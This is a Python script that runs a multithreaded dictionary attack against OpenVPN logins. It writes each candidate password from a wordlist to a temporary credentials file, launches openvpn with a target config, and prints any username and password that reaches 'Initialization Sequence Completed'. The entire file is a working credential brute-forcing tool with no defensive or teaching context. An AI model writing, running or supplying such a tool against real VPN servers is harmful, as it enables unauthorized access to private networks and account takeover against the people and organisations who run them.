from subprocess import Popen, PIPE
import sys
import argparse
import time
import os
from threading import Thread, current_thread, get_ident, Event
from queue import Queue



def createParser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--config')
    parser.add_argument('-u', '--user')
    parser.add_argument('-p', '--passw')
    parser.add_argument('-t', '--thread', type=int, default=3)

    return parser



def run(queue, result_queue):
    while not queue.empty():
        temp_pass = queue.get_nowait()             
        path_p = '/tmp/vpn_br'
        path_p = path_p + str(get_ident())          
        w = open(path_p, 'w')
        w.write(user+'\n'+temp_pass)
        w.close()
        status = checkVPN(path_p,temp_pass)
        os.remove(path_p)
        queue.task_done()



def checkVPN(pass_d, __pass):
    out = ''
    plu = 'Initialization Sequence Completed'
    fail = 'AUTH_FAILED'

    proc = Popen(['openvpn', '--config', config, '--auth-user-pass', pass_d], stdout=PIPE, stderr=PIPE)

    while 1:
        out = proc.stdout.readline()
        b = out.rstrip().decode('utf8')
       
        if plu in b:
            print("Find!",'\n',user,":",__pass)
            proc.kill()
            return True
    
        elif fail in b:
            print("Fail!",user,":",__pass)
            proc.kill()
            return False
    


def main():
    start_time = time.time()
    queue = Queue()
    result_queue = Queue()


    with open(pass_dict) as f:        
        for line in f:
            queue.put(line.strip())

    for i in range(thread_count):
        thread = Thread(target=run, args=(queue, result_queue))
        thread.daemon = True
        thread.start()
   
    queue.join()

    print(time.time() - start_time)


if __name__ == '__main__':
    parser = createParser()
    namespace = parser.parse_args(sys.argv[1:])

    config = namespace.config
    user = namespace.user
    pass_dict = namespace.passw
    thread_count = namespace.thread

    main()
